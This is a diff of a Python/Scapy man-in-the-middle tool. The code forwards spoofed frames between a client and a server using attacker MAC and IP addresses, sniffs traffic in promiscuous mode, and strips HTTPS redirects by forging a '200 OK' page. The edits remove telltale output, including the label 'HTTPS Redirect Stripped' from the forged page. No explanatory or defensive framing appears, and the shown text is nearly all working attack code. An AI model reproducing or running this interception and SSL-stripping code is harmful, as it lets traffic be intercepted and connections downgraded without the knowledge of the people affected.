@@ -56,12 +56,12 @@ def forwardClient(pkt, src_mac, dst_mac, iface):
     sc.sendp(sc.Ether(bytes(new_pkt)), iface=iface, verbose=False)
     log_packet("forwardClient", new_pkt)
 
-# === HTTPS Redirect Stripping (fallback) ===
+# === HTTPS Redirect Stripping ===
 
 def strip_https_redirect(pkt, attackerMac, clientMac, attackerIP, clientIP, iface):
-    print("[*] Intercepting and replacing HTTPS redirect with 200 OK")
+    print("Intercepting and replacing HTTPS redirect with 200 OK")
 
-    html = "<html><body><h1>Welcome (HTTPS Redirect Stripped)</h1></body></html>"
+    html = "<html><body><h1>Welcome</h1></body></html>"
     body = html.encode("utf-8")
     headers = (
         "HTTP/1.1 200 OK\r\n"
@@ -110,7 +110,7 @@ def forward_http_to_https(pkt, attackerMac, clientMac, attackerIP, clientIP, ser
             port = int(port_str)
         else:
             host = host_header
-            port = 4443  # Your HTTPS server port
+            port = 4443 
 
         headers["Host"] = host
 
@@ -121,7 +121,7 @@ def forward_http_to_https(pkt, attackerMac, clientMac, attackerIP, clientIP, ser
         response = conn.getresponse()
         response_body = response.read()
 
-        # Build raw HTTP response (status line + headers + body)
+        # Build raw HTTP response
         status_line = f"HTTP/1.1 {response.status} {response.reason}\r\n"
         headers_raw = ""
         for k, v in response.getheaders():
@@ -169,15 +169,15 @@ def forwarding(mode, iface, clientIP, attackerIP, clientMac, serverIP, attackerM
 
         if not handshake["done"]:
             if src == clientIP and is_syn(pkt):
-                print("[*] SYN from client")
+                print("SYN from client")
                 forwardServer(pkt, attackerMac, serverMac, iface)
                 handshake["client_syn"] = True
             elif src == serverIP and is_syn_ack(pkt):
-                print("[*] SYN-ACK from server")
+                print("SYN-ACK from server")
                 forwardClient(pkt, attackerMac, clientMac, iface)
                 handshake["server_synack"] = True
             elif src == clientIP and is_ack(pkt) and handshake["client_syn"] and handshake["server_synack"]:
-                print("[*] ACK from client — handshake complete")
+                print("ACK from client — handshake complete")
                 forwardServer(pkt, attackerMac, serverMac, iface)
                 handshake["done"] = True
             return
@@ -194,10 +194,10 @@ def forwarding(mode, iface, clientIP, attackerIP, clientMac, serverIP, attackerM
                 forwardClient(pkt, attackerMac, clientMac, iface)
 
         if is_rst(pkt) or is_fin(pkt):
-            print("[*] Connection closed.")
+            print("Connection closed.")
             sniffer.stop()
 
     sniffer = sc.AsyncSniffer(iface=iface, prn=handle, store=False, promisc=True)
-    print("[*] Sniffer started...")
+    print("Sniffer started...")
     sniffer.start()
     sniffer.join()
